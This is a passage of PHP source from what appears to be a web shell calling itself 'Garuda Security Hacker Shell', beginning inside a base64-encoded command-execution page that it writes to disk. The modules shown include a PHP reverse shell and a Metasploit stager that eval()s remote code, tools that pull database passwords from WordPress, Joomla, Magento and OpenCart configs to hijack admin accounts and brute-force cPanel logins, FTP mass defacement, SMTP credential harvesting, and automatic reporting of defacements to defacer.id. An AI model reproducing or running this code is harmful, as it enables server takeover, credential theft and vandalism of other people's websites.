jZT0iR2VuZXZhIiBhbGlnbj0iY2VudGVyIiBzaXplPSIyIiBjb2xvcj0iIzAwOTkwMCI+IENvZGVkIEJ5IE1hdXJpdGFuaWEgQXR0YWNrZXIgPC9mb250Pjxicj4NCjxmb3JtIG1ldGhvZD1nZXQgYWN0aW9uPSInLiRtZS4nIj4NCjxwPjx0ZXh0YXJlYSBjbGFzcz0iYXJlYSIgcm93cz0iMTMiIG5hbWU9IlMxIiBjb2xzPSI3MCIgPic7DQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+SWYgbm90aGluZyB3b3JrIGl0IG1lYW5zIHRoYXQgcHl0aG9uIGlzIG5vdCBlbmFibGVkIGluIHRoaXMgc2VydmVyIDooPC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz5Db21tYW5kOiBweXRob24gcmV2ZXJzZS5weSB5b3VySVAgUG9ydDwvc3Ryb25nPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJ2dyIgc2l6ZT0iNTAiIHZhbHVlPSJjbWQiPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29tbWFuZCIgc2l6ZT0iNDMiPiA8c2VsZWN0IG5hbWU9ZXhlY21ldGhvZD4NCjxvcHRpb24gdmFsdWU9InN5c3RlbSI+U3lzdGVtPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJleGVjIj5FeGVjPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+UGFzc3RocnU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJwb3BlbiI+cG9wZW48L29wdGlvbj4NCjwvc2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRXhlY3V0ZSI+DQo8L3A+PC9mb3JtPic7DQo/Pg==';
$file = fopen("kiter.php" ,"w+");
$write = fwrite ($file ,base64_decode($merdeeeee));
fclose($file);
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900">Python Connect Shell Priv8</span><center><center><br><iframe src=pyrevrshell/kiter.php width=75% height=70% frameborder=0></iframe></div></center>'; 
}

?>

<?


////////////////////////////////////////////
} elseif($_GET['do'] == 'tool') {
error_reporting(0);
function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = 
"<br><br><br>
<center>
<td><h2>Reverse shell ( php )</h2>
<form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'>
<table class='tabnet'>
<tr><td style='width:110px;'>Your IP</td>
<td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' />
</td></tr>
<tr><td>Port</td><td>
<input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' />
</td></tr></table>
<br><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
<br><input type='hidden' name='d' value='".$pwd."' />
</form></td><td>
<hr color='#4C83AF'><td><td>
<form method='POST'>
<table class='tabnet'>

<h2>Metasploit Connection </h2>
<tr><td style='width:110px;'>
Your IP</td>
<td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' />
</td></tr>
<tr><td>Port</td>
<td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
echo $s_result;
if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}	
} elseif($_GET['do'] == 'auto_edit_user') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='global' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='global' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
} elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							
						} else {
							$i++;
							if(function_exists('posix_getpwuid')) {
								$domain_cp = file_get_contents("/etc/named.conf");	
								if($domain_cp == '') {
									$dom =  "<font color=red>gabisa ambil nama domain nya</font>";
								} else {
									preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
									foreach($domains_cp[1] as $dj) {
										$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
										$user_cp_url = $user_cp_url['name'];
										if($user_cp_url == $ucp) {
											$dom = "<a href='http://$dj/' target='_blank'><font color=lime>$dj</font></a>";
											break;
										}
									}
								}
							} else {
								$dom = "<font color=red>function is Disable by system</font>";
							}
							echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>) domain ($dom)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Garuda Security Hacker Shell.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/^[client]$/", $ambil)) {
					preg_match("/password=(.*?)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					} else {
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Crack'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'cpftp_auto') {
	if($_POST['crack']) {
		$usercp = explode("\r\n", $_POST['user_cp']);
		$passcp = explode("\r\n", $_POST['pass_cp']);
		$i = 0;
		foreach($usercp as $ucp) {
			foreach($passcp as $pcp) {
				if(@mysql_connect('localhost', $ucp, $pcp)) {
					if($_SESSION[$ucp] && $_SESSION[$pcp]) {
					} else {
						$_SESSION[$ucp] = "1";
						$_SESSION[$pcp] = "1";
						if($ucp == '' || $pcp == '') {
							//
						} else {
							echo "[+] username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
							$ftp_conn = ftp_connect($ip);
							$ftp_login = ftp_login($ftp_conn, $ucp, $pcp);
							if((!$ftp_login) || (!$ftp_conn)) {
								echo "[+] <font color=red>Login Gagal</font><br><br>";
							} else {
								echo "[+] <font color=lime>Login Sukses</font><br>";
								$fi = htmlspecialchars($_POST['file_deface']);
								$deface = ftp_put($ftp_conn, "public_html/$fi", $_POST['deface'], FTP_BINARY);
								if($deface) {
									$i++;
									echo "[+] <font color=lime>Deface Sukses</font><br>";
									if(function_exists('posix_getpwuid')) {
										$domain_cp = file_get_contents("/etc/named.conf");	
										if($domain_cp == '') {
											echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
										} else {
											preg_match_all("#/var/named/(.*?).db#", $domain_cp, $domains_cp);
											foreach($domains_cp[1] as $dj) {
												$user_cp_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
												$user_cp_url = $user_cp_url['name'];
												if($user_cp_url == $ucp) {
													echo "[+] <a href='http://$dj/$fi' target='_blank'>http://$dj/$fi</a><br><br>";
													break;
												}
											}
										}
									} else {
										echo "[+] <font color=red>gabisa ambil nama domain nya</font><br><br>";
									}
								} else {
									echo "[-] <font color=red>Deface Gagal</font><br><br>";
								}
							}
							//echo "username (<font color=lime>$ucp</font>) password (<font color=lime>$pcp</font>)<br>";
						}
					}
				}
			}
		}
		if($i == 0) {
		} else {
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Garuda Security Hacker.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
		Filename: <br>
		<input type='text' name='file_deface' placeholder='index.php' value='index.php' style='width: 450px;'><br>
		Deface Page: <br>
		<input type='text' name='deface' placeholder='http://www.web-yang-udah-di-deface.com/filemu.php' style='width: 450px;'><br>
		USER: <br>
		<textarea style='width: 450px; height: 150px;' name='user_cp'>";
		$_usercp = fopen("/etc/passwd","r");
		while($getu = fgets($_usercp)) {
			if($getu == '' || !$_usercp) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all("/(.*?):x:/", $getu, $u);
				foreach($u[1] as $user_cp) {
						if(is_dir("/home/$user_cp/public_html")) {
							echo "$user_cp\n";
					}
				}
			}
		}
		echo "</textarea><br>
		PASS: <br>
		<textarea style='width: 450px; height: 200px;' name='pass_cp'>";
		function cp_pass($dir) {
			$pass = "";
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				if(!is_file("$dir/$dirb")) continue;
				$ambil = file_get_contents("$dir/$dirb");
				if(preg_match("/WordPress/", $ambil)) {
					$pass .= ambilkata($ambil,"DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/JConfig|joomla/", $ambil)) {
					$pass .= ambilkata($ambil,"password = '","'")."\n";
				} elseif(preg_match("/Magento|Mage_Core/", $ambil)) {
					$pass .= ambilkata($ambil,"<password><![CDATA[","]]></password>")."\n";
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/", $ambil)) {
					$pass .= ambilkata($ambil,'password = "','"')."\n";
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $ambil)) {
					$pass .= ambilkata($ambil,"'DB_PASSWORD', '","'")."\n";
				} elseif(preg_match("/client/", $ambil)) {
					preg_match("/password=(.*)/", $ambil, $pass1);
					if(preg_match('/"/', $pass1[1])) {
						$pass1[1] = str_replace('"', "", $pass1[1]);
						$pass .= $pass1[1]."\n";
					}
				} elseif(preg_match("/cc_encryption_hash/", $ambil)) {
					$pass .= ambilkata($ambil,"db_password = '","'")."\n";
				}
			}
			echo $pass;
		}
		$cp_pass = cp_pass($dir);
		echo $cp_pass;
		echo "</textarea><br>
		<input type='submit' name='crack' style='width: 450px;' value='Hajar'>
		</form>
		<span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
	}
} elseif($_GET['do'] == 'smtp') {
	echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span></center><br>";
	function scj($dir) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			if(!is_file("$dir/$dirb")) continue;
			$ambil = file_get_contents("$dir/$dirb");
			$ambil = str_replace("$", "", $ambil);
			if(preg_match("/JConfig|joomla/", $ambil)) {
				$smtp_host = ambilkata($ambil,"smtphost = '","'");
				$smtp_auth = ambilkata($ambil,"smtpauth = '","'");
				$smtp_user = ambilkata($ambil,"smtpuser = '","'");
				$smtp_pass = ambilkata($ambil,"smtppass = '","'");
				$smtp_port = ambilkata($ambil,"smtpport = '","'");
				$smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
				echo "SMTP Host: <font color=lime>$smtp_host</font><br>";
				echo "SMTP port: <font color=lime>$smtp_port</font><br>";
				echo "SMTP user: <font color=lime>$smtp_user</font><br>";
				echo "SMTP pass: <font color=lime>$smtp_pass</font><br>";
				echo "SMTP auth: <font color=lime>$smtp_auth</font><br>";
				echo "SMTP secure: <font color=lime>$smtp_secure</font><br><br>";
			}
		}
	}
	$smpt_hunter = scj($dir);
	echo $smpt_hunter;
} elseif($_GET['do'] == 'auto_wp') {
	if($_POST['hajar']) {
		$title = htmlspecialchars($_POST['new_title']);
		$pn_title = str_replace(" ", "-", $title);
		if($_POST['cek_edit'] == "Y") {
			$script = $_POST['edit_content'];
		} else {
			$script = $title;
		}
		$conf = $_POST['config_dir'];
		$scan_conf = scandir($conf);
		foreach($scan_conf as $file_conf) {
			if(!is_file("$conf/$file_conf")) continue;
			$config = file_get_contents("$conf/$file_conf");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."posts";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
				$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
				echo "<div style='margin: 5px auto;'>";
				if($target == '') {
					echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
				} else {
					echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
				}
				if(!$update OR !$conn OR !$db) {
					echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
				} else {
					echo "<font color=lime>sukses di ganti.</font><br>";
				}
				echo "</div>";
				mysql_close($conn);
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit Title+Content WordPress</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Garuda Security Hacker' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
		<textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}elseif($_GET['do'] == 'defacerid') {
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Iam Da Hacker'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='Garuda Security Hacker'><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input type='submit' name='go' value='Submit' style='width: 450px;'>
		</form>";
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$tim = $_POST['tim'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
